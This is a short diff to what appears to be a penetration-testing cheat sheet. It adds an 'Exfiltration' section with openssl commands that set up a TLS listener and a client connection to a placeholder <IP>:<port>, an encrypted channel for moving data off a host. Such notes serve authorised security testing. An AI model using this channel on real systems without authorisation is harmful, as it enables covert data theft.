@@ -47,3 +47,14 @@ iptables -P FORWARD ACCEPT
 sysctl net.ipv4.ip_forward=1
 
 ```
+
+### Exfiltration
+
+```
+On Server Side
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
+On a client, input the following:
+
+openssl s_client -quiet -connect <IP>:<port>
+```
